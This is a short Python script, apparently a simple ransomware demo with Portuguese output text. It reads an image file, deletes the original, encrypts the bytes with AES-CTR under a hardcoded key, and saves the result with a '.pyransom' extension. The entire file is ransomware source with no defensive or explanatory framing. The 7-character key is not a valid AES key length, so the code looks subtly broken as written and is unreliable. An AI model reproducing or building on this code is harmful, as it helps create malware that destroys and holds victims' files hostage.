import os
import pyaes
from time import sleep
sleep(1)
print('Iniciando processo de criptografia...')
sleep(2)

fileName = 'olhospy.jpg'
file = open(fileName, 'rb')
fileData = file.read()
file.close()
os.remove(fileName)

key = '@@@&&&7'
aes = pyaes.AESModeOfOperationCTR(key)
cryptoData = aes.encrypt(fileData)

newFileName = fileName + '.pyransom'
newFile = open(newFileName, 'wb')
newFile.write(cryptoData)
newFile.close()
